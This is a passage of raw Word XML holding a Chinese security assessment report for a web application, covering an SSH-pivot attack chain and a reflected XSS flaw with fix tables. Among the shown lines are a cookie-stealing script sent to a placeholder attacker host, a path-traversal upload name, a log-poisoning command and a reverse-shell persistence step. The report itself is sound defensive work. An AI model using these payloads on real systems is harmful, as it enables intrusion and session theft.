        <w:t xml:space="preserve">  │    ssh -i id_rsa root@target "nmap -sn 10.0.0.0/24"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    → 以目标为跳板扫描内网</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├─ ⑤ 上传恶意文件到 pages/ 目录</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    echo '{{SSTI_PAYLOAD}}' &gt; /tmp/shell.html</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    scp -i id_rsa /tmp/shell.html root@target:/opt/Class01/pages/</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    → 向 pages/ 写入恶意文件</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├─ ⑥ 触发恶意文件</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    curl "http://target/page?name=shell"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    → 页面渲染时执行 SSTI payload → RCE</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  └─ ⑦ 建立 C2 持久控制通道</w:t>
        <w:br/>
        <w:t xml:space="preserve">      crontab -e → 每分钟反弹 Shell 到 C2 服务器</w:t>
        <w:br/>
        <w:t xml:space="preserve">      → 即使服务器重启，C2 通道自动重建</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 内外网边界被彻底突破</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：公网 Web 漏洞直接导致内网服务器沦陷，防火墙形同虚设</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• Kali 全链路自动化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：整套攻击链可使用 Metasploit 框架自动化执行，攻击效率极高</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• C2 持久控制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：攻击者在服务器上植入 crontab/Systemd 后门，重启后仍可控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 内网全范围沦陷</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：以本机为跳板可扫描攻击同网段所有主机，将单点突破扩大为全线失守</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞攻击链（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>白名单修复后，攻击链在第一步即被完全阻断</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w: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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>攻击步骤</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞依赖</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修复后状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>① 发现 LFI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 白名单阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>② 读取 SSH 私钥</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1 → 漏洞 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 白名单阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>③ SSH 登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 私钥不可读取</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>④~⑥ 后续攻击</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>依赖前面步骤</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 执行路径已切断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 6】XSS 反射型 — page_content 无过滤渲染（CWE-79）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name={html_with_xss}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-79: Improper Neutralization of Input During Web Page Generation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>{{ page_content | safe }}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 渲染页面内容，Jinja2 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>| safe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 过滤器会</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>禁用 HTML 转义</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，使得任何 HTML/JavaScript 代码被直接插入页面 DOM 中执行。后端 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由将文件内容原封不动传给模板渲染，不经过任何过滤或转义。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&lt;!-- 漏洞代码 --&gt;</w:t>
        <w:br/>
        <w:t>{% if page_content %}</w:t>
        <w:br/>
        <w:t>&lt;div class="card"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;div class="page-content"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        {{ page_content | safe }}   &lt;- 禁用转义</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/div&gt;</w:t>
        <w:br/>
        <w:t>&lt;/div&gt;</w:t>
        <w:br/>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>场景 A — 读取恶意 HTML 文件触发 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Step 1: 通过 LFI 或上传功能在服务器上放置含恶意 JS 的文件</w:t>
        <w:br/>
        <w:t># 利用文件上传路径穿越（漏洞8）上传 XSS payload</w:t>
        <w:br/>
        <w:t>echo '&lt;script&gt;fetch("http://attacker/steal?cookie="+document.cookie)&lt;/script&gt;' &gt; xss.html</w:t>
        <w:br/>
        <w:t>上传文件名：../../pages/xss.html  → 文件写入 pages/xss.html</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 2: 通过 /page 路由触发 XSS</w:t>
        <w:br/>
        <w:t>GET /page?name=xss</w:t>
        <w:br/>
        <w:t>→ 页面渲染时执行 JavaScript</w:t>
        <w:br/>
        <w:t>→ 攻击者获取当前登录用户的 Session Cookie → 会话劫持</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>场景 B — 结合日志投毒触发 XSS（无需上传文件）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Step 1: 构造 HTTP 请求在日志中注入 XSS payload</w:t>
        <w:br/>
        <w:t>curl -A "&lt;script src=http://attacker/hook.js&gt;&lt;/script&gt;" http://target/</w:t>
        <w:br/>
        <w:t>→ User-Agent 被 Web 服务器记录到访问日志</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 2: LFI 包含日志文件触发 XSS</w:t>
        <w:br/>
        <w:t>GET /page?name=../../var/log/apache2/access.log</w:t>
        <w:br/>
        <w:t>→ 日志中的 script 标签被渲染 → XSS 执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• Session 劫持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：窃取登录用户的 Cookie，直接冒充用户身份操作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 凭证窃取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：构造伪造登录表单，通过 JS 窃取用户输入的账号密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
